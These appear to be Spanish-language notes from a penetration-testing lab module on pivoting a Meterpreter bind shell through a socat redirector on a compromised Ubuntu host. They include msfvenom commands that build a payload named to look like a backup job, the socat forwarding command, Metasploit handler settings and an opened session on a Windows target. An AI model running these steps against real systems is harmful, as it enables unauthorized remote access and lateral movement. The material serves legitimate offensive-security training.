
De manera similar al redireccionador de reverse shell de nuestro socat, también podemos crear un redireccionador de bind shell con socat. 

Esto es diferente de las reverse shells, las cuales se conectan de vuelta desde el servidor Windows al servidor Ubuntu y se redirigen a nuestro host atacante. 

En el caso de las bind shells, el servidor Windows iniciará un listener y se enlazará a un puerto determinado. 
Podemos crear un payload de bind shell para Windows y ejecutarla en el host Windows. 
Al mismo tiempo, podemos crear un redireccionador socat en el servidor Ubuntu, que escuchará conexiones entrantes desde un Metasploit bind handler y las reenviará a una payload de bind shell en un objetivo Windows. 

La figura siguiente debería explicar el pivot de una manera mucho mejor.

![[Pasted image 20251023123342.png]]

## Creando el payload de Windows

```shell-session
Polika4RM@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

Podemos iniciar un escucha de shell de enlace socat, que escucha en el puerto 8080 y reenvía paquetes al servidor Windows 8443.

#### Inicializando el listener Socat Bind Shell
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finalmente, podemos iniciar un controlador de enlace de Metasploit. Este controlador de enlace se puede configurar para conectarse al receptor de nuestro socat en el puerto 8080 (servidor Ubuntu).


#### Configuración e inicio del controlador/multibind
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

Podemos ver un controlador de enlace conectado a una solicitud de etapa pivotada a través de un oyente socat al ejecutar la carga útil en un objetivo de Windows.

#### Establishing Meterpreter Session
```shell-session
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```
